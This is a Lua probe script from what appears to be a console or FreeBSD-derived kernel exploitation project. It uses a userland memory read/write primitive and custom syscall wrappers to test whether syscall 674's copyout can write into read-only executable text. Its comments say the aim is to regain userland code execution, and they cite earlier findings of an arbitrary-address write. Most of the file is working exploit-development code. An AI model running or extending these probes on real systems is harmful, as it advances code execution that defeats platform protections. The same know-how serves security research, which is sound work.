-- CRASH_CLASS: HIGH
-- PROBE 1565a: can syscall 674's record copyout write into a READ-ONLY,
--              EXECUTABLE user page?  In other words, does a kernel copyout
--              respect the user PTE write bit on this kernel?
--
-- Context: 1563a measured that 674 writes min(entries, arg3) records of arg2
-- bytes to any address the caller names, with no buffer-length argument.  If
-- that copyout path bypassed the page's write permission, the destination could
-- be eboot's RX text: 72 bytes of kernel-generated data written into executable
-- code, which would be the first write to a code page this project has ever had
-- and would reopen code execution from userland.
--
-- On stock FreeBSD a copyout to a write-protected user page faults in kernel
-- mode, the fault handler sees VM_PROT_WRITE not in the entry's protection and
-- returns EFAULT through the onfault handler; 0x8ac191d0 installs exactly that
-- onfault (0x8ac191d4 mov rax,[gs:0x20] / mov [rax+0x108],r11).  So the expected
-- answer is EFAULT(14) and no change.  This has never been measured, and eboot
-- text is the one region that is both read-only for writes and readable for
-- verification: modules are XO (p=4) or p=1 and kill on read.
--
-- Detection: read 64 bytes at the target, call 674 with that address as the
-- record buffer, then read the same 64 bytes again and compare.  A
-- confirmation of EFAULT with unchanged bytes closes the question; rv=0 with
-- changed bytes is a code-page write.
--
-- The probe prints everything it needs BEFORE the write, because a successful
-- write into text will almost certainly kill the loader at the next call.
--
-- prior art:
--   results/phase36_realargs/1563a_sys674_record_bound_20261110_194414.txt
--     -- 674 writes min(entries, 400) * 72 bytes to an attacker-chosen address.
--   docs/ARG1_CLASSES_14_10.md:308 -- copyout argument order (user = rsi).
--   docs/HANDLER_CLAIM_CORRECTIONS.md:554 -- per-record copy is min(0x48, uap[8]).
--   424a-424c -- mprotect refuses the execute bit; 1535a/1562a -- 548 op 2 too.
--   docs/DEAD_ENDS.md "Module data is unreadable" -- p=1 and p=4 pages fault on
--     read, so eboot text (p=5) is the only readback-capable target.

print("=== PROBE 1565a: does 674's copyout respect the user page write bit? ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(uint64(a)) end)
    if ok then return to_num(v) end
    return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(uint64(a)) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(uint64(a), uint64(v)) end) end

local sc_getpid = mk(20)
local sc_547    = mk(547)
local sc674     = mk(674)

print(string.format("[0] pid=%d", to_num(sc_getpid())))

-- ---- [A] enumerate and find eboot's executable segment ----
local buf = memory.alloc(0x8000)
local cnt = memory.alloc(0x10)
wd(cnt, 0)
local okA, rvA = pcall(function()
    return sc674(uint64(buf), uint64(72), uint64(400), uint64(cnt),
                 uint64(0x40000000), uint64(0))
end)
local nA = rd(cnt) or 0
print(string.format("[A] 674 rv=%s count=%d", tostring(okA and to_num(rvA) or -999), nA))

local TEXT, TEXTEND, TEXTNAME = nil, nil, nil
for i = 0, nA - 1 do
    local base = buf + i * 72
    local start = rq(base)
    local enda  = rq(base + 8)
    local prot  = rd(base + 0x18)
    local name  = ""
    for o = 0x21, 0x38 do
        local c = rd(base + o)
        if c == nil or c == 0 then break end
        name = name .. string.char(c % 256)
    end
    if prot == 5 and start and enda and enda > start then
        if TEXT == nil or (enda - start) > (TEXTEND - TEXT) then
            TEXT, TEXTEND, TEXTNAME = start, enda, name
        end
    end
end
if TEXT then
    print(string.format("[A] largest prot-5 range: name='%s' [0x%X,0x%X)",
        tostring(TEXTNAME), TEXT, TEXTEND))
end
if not TEXT then
    print("[A] no prot-5 record; listing the exec ranges")
    for i = 0, math.min(nA, 40) - 1 do
        local base = buf + i * 72
        local p = rd(base + 0x18)
        if p == 5 then
            print(string.format("[A]   [0x%X,0x%X) prot=5", rq(base) or 0, rq(base + 8) or 0))
        end
    end
    print("=== VOID: no eboot text record, nothing to test ===")
    return
end
if TEXTEND - TEXT < 0x300000 then
    print(string.format("[A] the segment is only 0x%X long; using the midpoint",
        TEXTEND - TEXT))
end
local T = TEXT + math.floor((TEXTEND - TEXT) / 2 / 0x1000) * 0x1000
print(string.format("[A] target T=0x%X (inside the segment)", T))

-- ---- [B] read before, and prove the bytes are readable ----
local before = {}
for i = 0, 15 do before[i] = rd(T + i * 4) end
print(string.format("[B] before: %08X %08X %08X %08X",
    to_num(before[0] or 0), to_num(before[1] or 0),
    to_num(before[2] or 0), to_num(before[3] or 0)))
if before[0] == nil then
    print("=== VOID: T is not readable, the write could not be verified ===")
    return
end

-- ---- [C] the write ----
print("")
print(string.format("[C] 674(T=0x%X, 72, 1, cnt) -- one record into RX text", T))
print("[C] if this returns 0 and the bytes change, copyout ignores the write bit")
local okC, rvC = pcall(function()
    return sc674(uint64(T), uint64(72), uint64(1), uint64(cnt),
                 uint64(0x40000000), uint64(0))
end)
local rC = okC and to_num(rvC) or -999
print(string.format("[C] rv=%d count=%s", rC, tostring(rd(cnt))))

-- ---- [D] read after ----
local changed = 0
local firstOld, firstNew = nil, nil
for i = 0, 15 do
    local v = rd(T + i * 4)
    if v ~= before[i] then
        changed = changed + 1
        if firstOld == nil then firstOld, firstNew = before[i], v end
    end
end
print(string.format("[D] changed dwords=%d of 16", changed))
if firstOld ~= nil then
    print(string.format("[D] first change: 0x%08X -> 0x%08X",
        to_num(firstOld), to_num(firstNew or 0)))
end

print("")
if rC == 14 and changed == 0 then
    print("[D] EFAULT(14) and no change: copyout respects the page's write bit.")
    print("[D] The executable code page cannot be written through 674.")
elseif rC == 0 and changed > 0 then
    print("[D] *** rv=0 WITH CHANGED BYTES: a kernel copyout wrote into RX text ***")
    print("[D] *** this is a code-page write primitive -- investigate now ***")
elseif rC == 0 then
    print("[D] rv=0 but nothing changed: the call answered without copying")
else
    print(string.format("[D] rv=%d changed=%d: not a write; see errno above", rC, changed))
end

print("")
print("=== PROBE 1565a COMPLETE ===")
